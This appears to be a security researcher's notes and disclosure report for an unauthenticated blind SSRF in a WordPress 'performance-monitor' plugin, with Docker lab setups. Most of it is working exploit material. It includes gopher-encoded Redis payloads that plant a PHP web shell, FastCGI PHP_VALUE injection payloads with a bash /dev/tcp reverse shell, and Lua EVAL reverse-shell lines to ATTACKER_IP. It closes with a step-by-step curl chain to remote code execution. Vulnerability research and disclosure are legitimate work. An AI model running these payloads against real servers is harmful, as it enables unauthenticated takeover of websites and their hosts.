
# Root Cause
```php
public static function ensure_absolute_url( $url, $original_url ) {

$parsed_url = wp_parse_url( $url );

if ( ! isset( $parsed_url['scheme'] ) ) {

$parsed_original_url = wp_parse_url( $original_url );

$scheme = isset( $parsed_original_url['scheme'] ) ? $parsed_original_url['scheme'] : 'http';

$url = $scheme . '://' . ltrim( $url, '/' );

}
return $url;
}
```
- performance-monitor/includes/class-rest-callback.php : get_curl_data (uses -> )
	- performance-monitor/admin/class-curl.php -> ==get_analysed_page_data (no checks)==
		- ![[Pasted image 20260120183348.png]]
			- only injection point is on get_curl_data function
# Wordpress and requirements 

- you MUST first ==enable wp-json== by changing permalink setting in wordpress 
	-  here is the link to that functionality : 
	  `http://localhost:8000/wp-admin/options-permalink.php`
	- anything would do as long as it isnt plain
		- I used *Post name*
- install the plugin

| Target      | Version     | Method                    | Payload                                     |
| ----------- | ----------- | ------------------------- | ------------------------------------------- |
| **Redis**   | 5.x–6.x     | CONFIG SET dir+dbfilename | Old payload works                           |
| **Redis**   | 7.0+        | CONFIG SET (blocked)      | Use Lua EVAL RCE or external startup config |
| **Redis**   | 8.2.0–8.2.2 | XACKDEL overflow          | CVE-2025-62507 (complex)                    |
| **PHP-FPM** | 7.x         | FastCGI + PHP_VALUE       | Gopherus payload works                      |
# redis
the old payload (not working on the latest):
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

**Target Redis**: ≤ 6.x (e.g., Docker tags `redis:5`, `redis:6`).

it does the following steps:
```
Request 1 (set directory):

text
url=gopher://redis:6379/_CONFIG%20SET%20dir%20/var/www/html

Watch MONITOR → should see CONFIG SET dir "/var/www/html".

Request 2 (set filename):

text
url=gopher://redis:6379/_CONFIG%20SET%20dbfilename%20shell.php

Request 3 (write payload):

text
url=gopher://redis:6379/_SET%20x%20%22%3c%3fphp%20system%28%24_GET%5bc%5d%29%3b%20%3f%3e%22

Request 4 (trigger save):

text
url=gopher://redis:6379/_SAVE

Then http://localhost:8000/shell.php?c=id.
```
- the old payload on redis doesnt work cause we dont access to change `dir` or `filename` in newer versions
## the working one on unix's curl
```bash
curl 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A'
```
#### **Redis 7+ SSRF exploitation (updated 2024–2025)**
- testing for command injection
```lua
gopher://redis:6379/_EVAL "os.execute('id')" 0
```
- reverse shell
```lua
gopher://redis:6379/_EVAL "os.execute('/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')" 0
```
**Versions affected**: Redis 7.x–8.2.x (before patches in 8.3.2+).

[link to the research -> Redis CVE-2025-49844: Brief Summary of Critical Lua Use-After-Free RCE Vulnerability](https://zeropath.com/blog/cve-2025-49844-redis-lua-use-after-free-rce)

**Precondition**: Lua scripting must be enabled in Redis (often is by default in Docker). Test with:
```bash
sudo docker exec wp_redis redis-cli EVAL "return 'test'" 0
```

## the problem with SAVE 
- cant use it with curl statelessly (in seperate requests)
- how to bypass file premission denied? ![[Pasted image 20260120163933.png]] 
# FastCGI
the old payload:
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
- PHP respects `PHP_VALUE` overrides and `allow_url_include`, `disable_functions`, `safe_mode` directives. `safe_mode` is a legacy directive removed in PHP 5.4, but the payload is still broadly applicable to PHP 5.3–7.4 as long as PHP‑FPM is reachable and not heavily restricted.
- **Versions affected** : PHP‑FPM 5.3–7.4
	- It can still work on PHP 8.x if:
	    - The handler still honors `php://input` auto_prepend tricks.
	    - `disable_functions` is not already set to block `system`.
#### **PHP-FPM 8.x FastCGI exploitation (updated 2024–2025)**
- [ ] `auto_prepend_file = php://input` is set or can be overridden via `PHP_VALUE`
- [ ] The script target exists (e.g., `/var/www/html/index.php`).

```
gopher://php-fpm:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%A0%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%11PHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%10SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00a%07%00%3C%3Fphp%20system%28%24_POST%5B%27cmd%27%5D%29%3Bdie%28%29%3B%3F%3E
```

**Key changes for PHP 8.x**:
- Removed `safe_mode` (removed in PHP 5.4, causes parse errors in 8.x).
    
- Uses `PHP_VALUE` header injection which is still respected in 8.x.
    
- Targets `/var/www/html/index.php` (adjust to your actual webroot).
    
- Post body contains `cmd=<command>` parameter.

test with curl:
```bash
curl -X POST \
  'gopher://php-fpm:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%A0%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1...' \
  --data 'cmd=id'
```
# docker compose setups 

### latest versions
```yaml
services:
  db:
    image: mysql:8.4
    container_name: wp_db
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wp
      MYSQL_PASSWORD: wp
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 5s
      timeout: 5s
      retries: 10

  wordpress:
    image: wordpress:latest
    container_name: wp_latest
    depends_on:
      db:
        condition: service_healthy
    ports:
      - "8000:80"
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wp
      WORDPRESS_DB_PASSWORD: wp
      WORDPRESS_DB_NAME: wordpress

  php-fpm:
    image: php:7.4-fpm   # local image, used for FastCGI target
    container_name: php_fpm
    restart: unless-stopped
    volumes:
      - wp_html:/var/www/html
    expose:
      - "9000"

  redis:
    image: redis:6.2     # local image, supports CONFIG SET dir/dbfilename
    container_name: wp_redis
    restart: unless-stopped
    command: >
      redis-server
      --protected-mode no
      --save ""
      --appendonly no
    volumes:
      - wp_html:/var/www/html

volumes:
  wp_html:

```

### deprecated (for payload backward compatibility)

```yaml
services:
  db:
    image: mysql:8.4
    container_name: wp_db
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wp
      MYSQL_PASSWORD: wp
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 5s
      timeout: 5s
      retries: 10

  wordpress:
    image: wordpress:latest
    container_name: wp_latest
    depends_on:
      db:
        condition: service_healthy
    ports:
      - "8000:80"
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wp
      WORDPRESS_DB_PASSWORD: wp
      WORDPRESS_DB_NAME: wordpress

  php-fpm:
    image: php:7.4-fpm   # local image, used for FastCGI target
    container_name: php_fpm
    restart: unless-stopped
    volumes:
      - wp_html:/var/www/html
    expose:
      - "9000"

  redis:
    image: redis:6.2     # local image, supports CONFIG SET dir/dbfilename
    container_name: wp_redis
    restart: unless-stopped
    command: >
      redis-server
      --protected-mode no
      --save ""
      --appendonly no
    volumes:
      - wp_html:/var/www/html

volumes:
  wp_html:

```


# config options
- i used to try dnstt in hard situation of my country 
```bash
  ./dnstt-client-linux-amd64 -udp 2.189.188.190:53 -pubkey b512d4934a9d6d8e9cc7000d37c314db0c944915c24ae623a75686f58e84b074 t.colorsand.pro 127.0.0.1:7000
  ```
  and as for doing that I was planning to configure docker to pull the following images:
-  docker pull redis:7
- docker pull php:8.2-fpm
- docker pull redis:6
 
 and proxy the traffic internally, which i have configured as bellow:
```bash
sudo mkdir -p /etc/systemd/system/docker.service.d
sudo nano /etc/systemd/system/docker.service.d/http-proxy.conf
```
Add this content (replace `7000` if your proxy port differs):
```bash
[Service]
Environment="HTTP_PROXY=socks5h://127.0.0.1:7000"
Environment="HTTPS_PROXY=socks5h://127.0.0.1:7000"
```
**Key detail**: use `socks5h://` (not `socks5://`) – the `h` means "resolve hostnames through the proxy", which is critical for reaching Docker Hub via your tunnel.

- tep 2: Reload systemd and restart Docker
```bash
sudo systemctl daemon-reload
sudo systemctl restart docker
```
- Verify the config took effect:
```bash
systemctl show --property=Environment docker
```


# report 

## Description

This plugin contains a cURL function accessible at /wp-json/plugin/v1/curl_data?url=[Domain name with scheme] which is vulnerable to unauthenticated blind SSRF. Any domain name can be supplied as the value of the url parameter (scheme is required). The domain name receives no validation beyond the default WordPress esc_url() function and does not pass through any whitelist. This behavior extends to the scheme and protocol of the request, opening the door to all attack chains achievable through blind SSRF (for further reference, see https://github.com/assetnote/blind-ssrf-chains).

As proof of concept and to demonstrate this behavior, I configured Redis 5 with settings specified in a Docker Compose file as a laboratory environment and achieved unauthenticated remote code execution through the Gopher protocol. Note that this is also reproducible against other services that accept raw Gopher requests.

Since the root cause of this vulnerability resides in the failure to validate request schemes and the absence of domain filtering for unauthenticated users, it is also possible to exploit other protocols such as file:// and php:// to chain additional vulnerabilities (although this behavior has not been fully tested).

the docker-compose.yml file for your convenience:
```yml
services:
  db:
    image: mysql:8.4
    container_name: wp_db
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wp
      MYSQL_PASSWORD: wp
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 5s
      timeout: 5s
      retries: 10

  wordpress:
    image: wordpress:latest
    container_name: wp_latest
    depends_on:
      db:
        condition: service_healthy
    ports:
      - "8000:80"
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wp
      WORDPRESS_DB_PASSWORD: wp
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wp_html:/var/www/html

  redis:
    image: redis:5
    container_name: wp_redis
    restart: unless-stopped
    user: "33:33"  # Runs as www-data
    command: >
      redis-server
      --protected-mode no
      --appendonly no
      --save "900 1"
      --dir /var/www/html
    volumes:
      - wp_html:/var/www/html
    ports:
      - "6379:6379"

volumes:
  wp_html:
```

### Prerequisites
- WordPress installation with the vulnerable plugin activated
- Permalinks configured to enable REST API access
- Redis 5 running on an accessible network interface (or any Gopher-compatible service)
- cURL command-line utility

### Step-by-Step Exploitation

**Step 1: Verify Plugin Functionality**

Execute a harmless health check request to confirm the endpoint responds:

```bash
curl --path-as-is -i -s -k -X GET \
  -H 'Host: localhost:8000' \
  -H 'Connection: keep-alive' \
  'http://localhost:8000/wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_INFO'
```

**An example of expected Response:**
```json
{
  "data": {
    "error": "Error fetching page: Operation timed out after 100002 milliseconds with 3239 bytes received"
  },
  "success": true,
  "message": null
}
```

Status code: `200 OK`

**Step 2: Configure Redis for Code Execution**

Execute the following requests sequentially. Replace `redis` with the appropriate IP address or hostname based on your environment.

**Request 1 – Set working directory:**
the endpoint: /wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_CONFIG%2520SET%2520dir%2520/var/www/html
```bash
curl --path-as-is -i -X GET \
  -H 'Host: localhost:8000' \
  -H 'Connection: keep-alive' \
  'http://localhost:8000/wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_CONFIG%2520SET%2520dir%2520/var/www/html'
```

**Request 2 – Set output filename:**
the endpoint: /wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_CONFIG%2520SET%2520dbfilename%2520shell.php
```bash
curl --path-as-is -i -X GET \
  -H 'Host: localhost:8000' \
  -H 'Connection: keep-alive' \
  'http://localhost:8000/wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_CONFIG%2520SET%2520dbfilename%2520shell.php'
```

**Request 3 – Flush database:**
the endpoint: /wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_FLUSHALL
```bash
curl --path-as-is -i -X GET \
  -H 'Host: localhost:8000' \
  -H 'Connection: keep-alive' \
  'http://localhost:8000/wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_FLUSHALL'
```

**Request 4 – Write PHP payload:**
the endpoint: /wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_SET%2520%250Ax%2520%2522%253c%253fphp%2520system%2528%2524_GET%255bcmd%255d%2529%253b%2520%253f%253e%2522
```bash
curl --path-as-is -i -X GET \
  -H 'Host: localhost:8000' \
  -H 'Connection: keep-alive' \
  'http://localhost:8000/wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_SET%2520%250Ax%2520%2522%253c%253fphp%2520system%2528%2524_GET%255bcmd%255d%2529%253b%2520%253f%253e%2522'
```

**Request 5 – Persist changes to disk:**
the endpoint: /wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_SAVE
```bash
curl --path-as-is -i -X GET \
  -H 'Host: localhost:8000' \
  -H 'Connection: keep-alive' \
  'http://localhost:8000/wp-json/performance-monitor/v1/curl_data?url=gopher://redis:6379/_SAVE'
```

Once the payload is written,you can execute arbitrary system commands via the bellow endpoint:
/shell.php?cmd=COMMAND

### Environment Notes
- Replace `localhost:8000` with the actual WordPress hostname and port
- Replace `redis` with the Redis container hostname or IP address (e.g., `127.0.0.1`, `redis-service`, or an internal IP)
- The `--path-as-is` flag prevents cURL from normalizing the request path
- The `Connection: keep-alive` header improves reliability but is not strictly required (but the response you will get might defer if you dont use it)
/gitcomm